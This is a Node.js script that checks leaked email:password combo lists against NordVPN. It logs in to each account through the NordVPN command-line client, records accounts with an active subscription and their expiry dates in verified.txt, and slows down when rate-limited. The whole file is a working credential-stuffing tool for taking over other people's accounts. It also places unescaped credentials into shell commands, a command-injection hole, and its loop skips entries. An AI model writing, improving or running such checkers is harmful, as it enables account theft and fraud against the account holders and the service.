import { execSync } from "child_process";
import { appendFileSync, existsSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from "fs";
import { resolve } from "path";

const rawAcc = readFileSync("acc.txt", "utf-8").split("\n");
if (existsSync("acc") && statSync("acc").isDirectory()) {
  readdirSync("acc").forEach((v) => {
    if (v != ".gitkeep") {
      rawAcc.push(...readFileSync(resolve("acc", v), "utf-8").split("\n"));
      rmSync(resolve("acc", v));
    }
  });
}

const accounts = rawAcc.map((v) => v.match(/([\w\-\.]*)\@([\w\-\.]{3,})\.([\w]{2,})\:([^\ ]{6,})/gi)?.[0] || "").filter((v) => !!v);
if (accounts.length == 0) {
  console.error("there are no accounts left to be checked.");
  process.exit(1);
}
console.log("[LOG] found %s, checking %s accounts", accounts.length);
let i = 0,
  cooldown = 30;
checker: while (i < accounts.length) {
  if (i > 0) {
    console.log("Sleeping for %ss", cooldown);
    const a = Date.now() / 1000;
    while (Date.now() / 1000 - a < cooldown) {}
  }

  const acc = accounts[i];
  console.log("Checking: %s", acc);
  let pass = acc?.split(":").slice(-1)[0];
  let user = acc?.substring(0, acc.indexOf(pass) - 1);

  try {
    execSync(`nordvpn login --username ${user} --password ${pass}`);
    const res = execSync("nordvpn account");
    const output = res.toString();
    const checkRexExp = /VPN Service\: Active \(Expires on ([\w\ \,]*)\)/gi;
    let status;
    if ((status = checkRexExp.exec(output))) {
      const expiration = status[1];
      console.log("Found valid account %s | Expiration: %s", acc, expiration);
      appendFileSync("verified.txt", `${acc} | Expiration: ${expiration}`);
    }
    accounts.shift();
    execSync("nordvpn logout");
    cooldown = 30;
    i++;
  } catch (error) {
    if (error.output && error.output instanceof Array) {
      const output = error.output
        .map((v) => (v instanceof Buffer ? v.toString() : String(v)))
        .filter((v) => !!v?.trim())
        .join("\n");
      if (/We're having trouble reaching our servers/gi.test(output)) {
        console.error("Got rate-limit, delaying...");
        cooldown *= 2;
      } else {
        cooldown = 30;
        i++;
      }
    } else {
      error.log(error);
      i++;
    }
    accounts.shift();
  }
  writeFileSync("acc.txt", accounts.join("\n"));
}